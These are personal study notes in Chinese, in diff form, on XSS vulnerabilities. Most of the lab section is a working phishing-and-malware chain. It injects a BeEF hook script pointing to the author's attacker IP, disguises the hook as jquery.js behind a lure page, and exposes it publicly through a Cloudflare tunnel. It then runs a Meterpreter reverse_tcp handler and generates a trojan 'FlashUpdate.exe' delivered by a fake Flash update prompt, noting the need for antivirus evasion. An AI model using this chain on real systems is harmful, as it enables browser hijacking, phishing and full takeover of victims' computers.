@@ -1,0 +1,184 @@
+第十二章 XSS漏洞 
+1 .如何远程触发浏览器的弹窗？
+> 核心条件只有一条：
+必须在对方的浏览器里，执行一段 JavaScript 代码。
+> 因为浏览器弹窗alert(),  confirm(),  prompt()是 JavaScript 的固有功能，只要代码能跑起来，弹窗就会出现。
+> 你是否能让对方的浏览器运行你的 <script> 标签或 JS 函数”。只要你能做到这一点，弹窗就实现了
+2 .什么是XSS漏洞？
+---XSS（Cross Site Scripting）：跨站脚本攻击，为了不和”层叠样式表”（Cascading StyleSheet s）的缩写CSS混合，所以改名为XSS。
+---XSS原理：攻击者在网页中嵌入客户端脚本（通常是JavaScript的恶意脚本），当用户使用浏览器加载被嵌入恶意代码的网页时，恶意脚本代码就会在用户的浏览器执行，造成跨站脚本攻击。
+---XSS漏洞.常出现的场景（只要能够输入，就可能有XSS）
+重灾区：评论区、留言区、个人信息、订单信息等
+针对型：站内信、网页即时通讯、私信、意见反馈等
+存在风险：搜索框、当前目录、图片属性等
+
+3 .XSS分类
+XSS 主要分为三类：反射型、存储型、DOM 型。
+----
+> 反射型 XSS（非持久型）
+特点：恶意脚本通过 URL 参数传递，服务器收到后直接拼接在 HTML 里返回，只影响当前这一次访问。
+例子： xss-labs.com:1027 第一、二、三关都是反射型。
+常见场景：搜索框、URL 参数。
+----
+> 存储型 XSS（持久型）
+特点：恶意脚本被保存在服务器数据库中，每当有人访问包含该数据的页面时，脚本都会自动执行。影响范围大，所有访问者都可能中招。
+例子：留言板、评论区、帖子标题——攻击者把 <script>alert(1)</script> 写在评论里，存储到数据库，之后每个打开该页面的人都会弹窗。
+危害：比反射型大得多，因为它会“传染”。持久性和稳定性，危害最大。
+----
+> DOM型XSS（基于文档对象模型，特殊的反射型）
+特点：全程在浏览器前端发生，不需要经过服务器后端。恶意脚本通过修改页面 DOM 结构来执行。
+例子：document.write(location.hash) 或 eval(location.href) 这类前端代码，如果没对用户输入做过滤，攻击者就能利用 URL 中的 # 后面的内容注入脚本。
+区别：反射型和存储型需要服务器参与，DOM 型完全由前端 JavaScript 引起。
+
+4 .如何检测/识别一个网站是否有XSS漏洞？
+> 所有用户输入的地方都可能存在XSS
+> 在输入框，输入<script>alert(123)</script>等，如果有弹窗123，说明具有XSS漏洞
+> 借助工具来扫描，比如：burpsuite等（当然还有其他工具）
+
+5 .XSS的危害（主要是存储型，反射型XSS没啥太大的危害）
+浏览器弹窗，能做哪些坏事？
+> 针对用户：劫持Cookie、网络钓鱼、植马挖矿、广告刷流量告
+> 针对web服务：制作Web蠕虫、篡改页面、劫持后台
+----
+如何使用XSS漏洞干坏事？
+这时候用到XSS平台，可以获取到许多攻击性的代码
+自己ph[study搭建”蓝莲花XSS平台”，开源项目，出自清华大学的蓝莲花战队。
+打开phpstudy,访问浏览器网站 bluelotus-xss.com:1032
+----
+XSS漏洞属于一个前端漏洞，通常是由js代码(java script)实现的
+
+6 .XSS的防御方法> 对用户的输入进行合理验证
+对特殊字符（如<、>、’、"等）以及<script>、javascript等字符进行过滤
+> 根据数据位置设置恰当的输出编码
+根据数据将要置于HTML上下文中的不同位置（HTML标签、HTML属性、JavaScript脚本、CSS、URL），对所有不可信数据进行恰当的输出编码
+> 设置Http Only属性（最常见）
+避免 攻击者利用xs s漏洞进行Cookie劫持攻击
+
+7 .还知道哪些漏洞？
+XSS、文件上传、文件包含、rce、csrf、SQL注入、ssrf
+xxe、反序列化、逻辑漏洞
+
+8 .XSS闯关练习
+我自己用phpstudy，搭建了一个网站xss-labs.com:1027
+该网站的目的就是：让你通过不断地“注入”恶意代码，亲身体验XSS漏洞是怎么被利用的。
+简单说，它的规则就是：每一关给你一个网页，你需要找到办法，让这个网页弹出一个写着“123”的对话框。 只要能弹出来，就算过关。
+
+------
+第一关，地址栏中test替换成 <script>alert(123)</script>
+把用户的输入直接当成了网页源代码的一部分，没有任何过滤和转义。 这就是最简单、最直接的XSS漏洞原理
+第二关，地址栏中test替换成 "><script>alert(123)</script>
+先闭合属性（双引号闭合），再塞标签
+第三关，地址栏中test替换成 '><script>alert(123)</script>
+单引号闭合
+
+9 .工具：BeEF
+> BeEF全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。
+用Ruby语言开发的，用于实现对XSS漏洞的攻击和利用。
+---BeEF不光是针对XSS漏洞的，如果一个网站上没有XSS漏洞，BEEF依然可以使用。但前提是需要有其他方式把 BeEF 的“钩子”（Hook）代码注入到受害者的浏览器中。
+---
+本质上就是一种“钓鱼”（欺骗）。它属于客户端攻击，而不是针对服务器端漏洞的攻击。
+
+> BeEF是怎么工作的？
+简单概括为三个步骤：“撒钩子” -> “等上钩” -> “发指令”
+工作原理是让受害者的浏览器（被称作“僵尸”）与BeEF的控制服务器建立一个持久的“双向通道”，然后由攻击者通过这个通道发送各种模块化的攻击指令
+
+> BeEF的功能
+信息搜集：可以实现网络发现、主机信息获取、cookie获取、会话劫持、获取键盘记录、获取插件信息等功能
+持久化控制：可以实现确认弹框，小窗口和中间人攻击。
+社会工程学攻击：可以实现点击劫持、弹窗告警、虚假页面和钓鱼页面等攻击
+渗透攻击：可以实现内网渗透、CSRF跨站请求伪造攻击、DDOS攻击，还可以结合Metasploit Framework（MSF）使用
+----
+BeEF，全称：Browser Exploitation Framework，中文翻译：浏览器利用框架
+MSF，全称：Metasploit Framework，中文翻译：元利用框架（通常不直译，普遍直接称为 Metasploit 框架）
+CS,全称：Cobalt Strike
+中文翻译：通常不直接翻译，业内普遍直接称其为 Cobalt Strike。如果按字面意思，可以译作“钴打击”或“钴锤”，但在实际交流中几乎没人这么说。
+
+> BeEF安装和调试
+Kail虚拟机：已安装，和MSF一样，通常是在kali里面使用的。打开kali终端，输入以下两条命令（sudo su root  sudo beef-xss-start ）即可使用。
+            用户名 beef  密码 kali
+
+如果想其他电脑（非kali虚拟机）访问，就需要把127.0.0.1改成kali的IP。
+Hook: <script src="http://192.168.1.163:3000/hook.js"></script>
+Example: <script src="http://127.0.0.1:3000/hook.js"></script>
+在主机访问dvwa.com:1024——安全调低——XSS反射型里面输入 
+<script src="http://192.168.1.163:3000/hook.js"></script>——F12，打开开发者模式——网络，
+这时候会发现hook.js?BEEFHOOK=HuO...一大堆东西——回到kali浏览器beef页面，发现有dvwa.com和主机IP（钩住了主机的浏览器）——点击IP（192.168.1.13）会发现主机浏览器的各种信息和操作，同时 我们还可以在kali浏览器该beef页面对主机浏览器进行操作
+（这时候我解决kali浏览器的翻译问题，默认的依赖系统自带的 Google 翻译接口，因此翻译不了，我加了插件：沉浸式翻译 Immersive Translate）
+
+Win11主机：官方并不推荐在 Windows 上安装和使用 BeEF，BeEF 设计之初主要是为 Linux 
+和 macOS 这类类 Unix 系统服务的。
+----
+MSF能装到win11主机，BEEF就不能
+MSF是商业软件，有人专门为Windows开发了安装包；而BeEF是个开源项目，开发者选择了不把精力花在支持Windows上
+----
+查看BEEF的配置：cd /usr/share/beef-xss  然后ls
+命令 cat config.yaml ; config相关的就是存放敏感/重要数据的地方
+
+> 利用BeEF进行网页钓鱼
+第一步
+已知Hook: <script src="http://192.168.1.163:3000/hook.js"></script>
+Example: <script src="http://127.0.0.1:3000/hook.js"></script>
+准备攻击代码
+<script src="http://192.168.1.163:3000/hook.js"></script>
+将攻击代码放到钓鱼网站里
+Kali里面，执行sudu su root     beef-xss-start
+然后cd /usr/share/beef-xss切换目录
+sudo wget http://192.168.1.163:3000/hook.js -O /var/www/html/jquery.js（IP是kali的IP）
+cd /var/www/html
+ls  查看发现，多了个jquery.js（这个就是钩子）
+第二步
+制作鱼饵，制作一个东西，发给别人，别人会点击（先关闭火绒安全软件和电脑防火墙）
+有很多方法传播 钩子jquery.js 。我这里用一个有趣的爱心代码。
+目前这种方法有技术问题，而且生成的.exe，会被受害者电脑的防火墙直接杀掉
+值得一提的是，jquery.js钩子本身不会被防火墙/安全软件杀掉
+我用第二种方法，把爱心代码（公开版）传到kali里面，然后kali生成一个网址，受害者电脑打开这个网址，不但能弹出爱心页面，同时钩子也会捕获到对方浏览器的信息，可以执行任何操作。
+第三步
+执行这个代码，python3 -m http.server 8080，目的就是向外网提供一个接口，让外界可以访问到这个钩子网站
+http://192.168.1.163:8080/index.html 访问这个即可成功，并且手机上的浏览器也能抓到
+（在win10虚拟机里面测试还是主机IP的原因是 NET模式，但是确实抓取成功）
+----
+下载 Cloudflare Tunnel
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+chmod +x cloudflared
+sudo mv cloudflared /usr/local/bin/
+----
+暴露本地的 3000 端口（BeEF）
+cloudflared tunnel --url http://localhost:3000
+----
+以上操作是把链接暴露在公网里面，让其他地方的人都能访问
+
+> BEEF与MSF联合使用
+MSF是kali里面的，不是win11主机上的
+当BeEF帮你“勾住”了对方的浏览器后，MSF的作用就是帮你把攻击从“浏览器层面”推进到“操作系统层面”，实现对目标电脑的真正控制。
+----
+Kali虚拟机终端
+打开MSF：msfconsole   
+执行控制命令，比如
+监听操作：
+handler -H 192.168.1.163 -P 4444 -p windows/meterpreter/reverse_tcp
+（H后门跟kali的IP，P后面跟端口1~65535，p后面跟操作命令）
+接下来是监听后的设置等代码，代码问AI
+比如 生成木马程序：
+generlate -f exe -o /var/www/html/FlashUpdate.exe
+（f后跟文件类型，o后面跟输出目录和文件名）
+cd /var/www/html
+ls
+----
+接下来还可以在beef里面修改弹窗页面(让弹窗变得好看点)
+点击钩到的浏览器IP——命令——社会工程学——Fake Flash Update
+这里可以让弹窗变得好看点
+执行后，被勾到的主机(比如win11)，会出现一个特别的弹窗，点击弹窗，受害者浏览器会自动下载木马程序FlashUpdate.exe（这个需要免杀操作，否则会被防火墙直接杀掉）
+----
+受害者点击.exe运行后，kali虚拟机里的MSF> 会发生变化
+Session 进行查看
+反正就是利用MSF，可以对受害者电脑进行各种操作
+----
+一句话，beef只能对受害者浏览器进行操作，MSF可以通过kali终端 敲命令对受害者整台电脑进行操作
+MSf敲命令，浪费时间还吃技术
+但是MSF 不像普通软件那样有“连接”按钮，但确实可以绕过繁琐的命令行：
+使用 Armitage 或 Kage 这类图形界面工具来操作 MSF，两个工具在windows linux系统都能用，但是kali不自带，需要自己装
+
+> 一条链接获取对方定位
+--ubuntu虚拟机，（websec），装图形化页面
+sudo apt update
+sudo apt install ubuntu-desktop -y
